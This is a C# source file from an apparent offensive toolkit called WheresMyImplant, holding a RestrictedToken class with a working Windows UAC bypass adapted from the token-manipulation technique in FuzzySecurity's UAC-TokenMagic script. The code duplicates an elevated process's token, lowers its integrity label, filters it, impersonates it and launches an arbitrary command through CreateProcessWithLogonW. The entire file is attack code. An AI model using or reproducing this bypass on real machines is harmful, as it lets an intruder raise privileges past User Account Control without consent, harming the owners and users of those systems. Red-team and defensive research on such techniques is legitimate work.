using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;
using System.Text;

using Unmanaged.Headers;
using Unmanaged.Libraries;

namespace WheresMyImplant
{
    class RestrictedToken : Tokens
    {
        IntPtr luaToken;

        internal RestrictedToken()
            : base(false)
        {
            luaToken = new IntPtr();
            WriteOutputGood(String.Format("Running as: {0}", WindowsIdentity.GetCurrent().Name));
        }

        ////////////////////////////////////////////////////////////////////////////////
        //https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean BypassUAC(Int32 processId, String command)
        {
            if (GetPrimaryToken((UInt32)processId))
            {
                if (SetTokenInformation())
                {
                    if (ImpersonateUser())
                    {
                        if (CreateProcess.CreateProcessWithLogonW(phNewToken, command, ""))
                        {
                            advapi32.RevertToSelf();
                            return true;
                        }
                    }
                    advapi32.RevertToSelf();
                }
            }
            return false;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean GetPrimaryToken(UInt32 processId)
        {
            //Originally Set to true
            IntPtr hProcess = kernel32.OpenProcess(Constants.PROCESS_QUERY_LIMITED_INFORMATION, false, processId);
            if (hProcess == IntPtr.Zero)
            {
                WriteOutputBad(String.Format("Unable to Open Process Token: {0}", processId));
                return false;
            }
            WriteOutputGood(String.Format("Recieved Handle for: {0}", processId));
            WriteOutputGood(String.Format("Process Handle: 0x{0}", hProcess.ToString("X4")));

            if (!kernel32.OpenProcessToken(hProcess, (UInt32)Winnt.ACCESS_MASK.MAXIMUM_ALLOWED, out hExistingToken))
            {
                WriteOutputBad(String.Format("Unable to Open Process Token: 0x{0}", hProcess.ToString("X4")));
                return false;
            }
            WriteOutputGood(String.Format("Primary Token Handle: 0x{0}", hExistingToken.ToString("X4")));
            kernel32.CloseHandle(hProcess);

            Winbase._SECURITY_ATTRIBUTES securityAttributes = new Winbase._SECURITY_ATTRIBUTES();
            if (!advapi32.DuplicateTokenEx(
                        hExistingToken,
                        (UInt32)(Constants.TOKEN_ALL_ACCESS),
                        ref securityAttributes,
                        Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Winnt.TOKEN_TYPE.TokenPrimary,
                        out phNewToken
            ))
            {
                WriteOutputBad("DuplicateTokenEx: ");
                return false;
            }
            WriteOutputGood(String.Format("Existing Token Handle: {0}", hExistingToken.ToString("X4")));
            WriteOutputGood(String.Format("New Token Handle: {0}", phNewToken.ToString("X4")));
            kernel32.CloseHandle(hExistingToken);
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean SetTokenInformation()
        {
            Winnt._SID_IDENTIFIER_AUTHORITY pIdentifierAuthority = new Winnt._SID_IDENTIFIER_AUTHORITY();
            pIdentifierAuthority.Value = new byte[] { 0x0, 0x0, 0x0, 0x0, 0x0, 0x10 };
            byte nSubAuthorityCount = 1;
            IntPtr pSID = new IntPtr();
            if (!advapi32.AllocateAndInitializeSid(ref pIdentifierAuthority, nSubAuthorityCount, 0x2000, 0, 0, 0, 0, 0, 0, 0, out pSID))
            {
                WriteOutputBad("AllocateAndInitializeSid: ");
                return false;
            }

            WriteOutputGood(String.Format("Initialized SID : 0x{0}", pSID.ToString("X4")));

            Winnt._SID_AND_ATTRIBUTES sidAndAttributes = new Winnt._SID_AND_ATTRIBUTES();
            sidAndAttributes.Sid = pSID;
            sidAndAttributes.Attributes = Constants.SE_GROUP_INTEGRITY_32;

            Winnt._TOKEN_MANDATORY_LABEL tokenMandatoryLabel = new Winnt._TOKEN_MANDATORY_LABEL();
            tokenMandatoryLabel.Label = sidAndAttributes;
            Int32 tokenMandatoryLableSize = Marshal.SizeOf(tokenMandatoryLabel);

            if (0 != ntdll.NtSetInformationToken(phNewToken, 25, ref tokenMandatoryLabel, tokenMandatoryLableSize))
            {
                WriteOutputBad("NtSetInformationToken: ");
                return false;
            }
            WriteOutputGood(String.Format("Set Token Information : 0x{0}", phNewToken.ToString("X4")));

            Winbase._SECURITY_ATTRIBUTES securityAttributes = new Winbase._SECURITY_ATTRIBUTES();
            if (0 != ntdll.NtFilterToken(phNewToken, 4, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken))
            {
                WriteOutputBad("NtFilterToken: ");
                return false;
            }
            WriteOutputGood(String.Format("Set LUA Token Information : 0x{0}", luaToken.ToString("X4")));
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean ImpersonateUser()
        {
            Winbase._SECURITY_ATTRIBUTES securityAttributes = new Winbase._SECURITY_ATTRIBUTES();
            if (!advapi32.DuplicateTokenEx(
                        luaToken,
                        (UInt32)(Constants.TOKEN_IMPERSONATE | Constants.TOKEN_QUERY),
                        ref securityAttributes,
                        Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Winnt.TOKEN_TYPE.TokenImpersonation,
                        out phNewToken
            ))
            {
                WriteOutputBad("DuplicateTokenEx: ");
                return false;
            }
            WriteOutputGood(String.Format("Duplicate Token Handle : 0x{0}", phNewToken.ToString("X4")));
            if (!advapi32.ImpersonateLoggedOnUser(phNewToken))
            {
                WriteOutputBad("ImpersonateLoggedOnUser: ");
                return false;
            }
            return true;
        }
    }
}
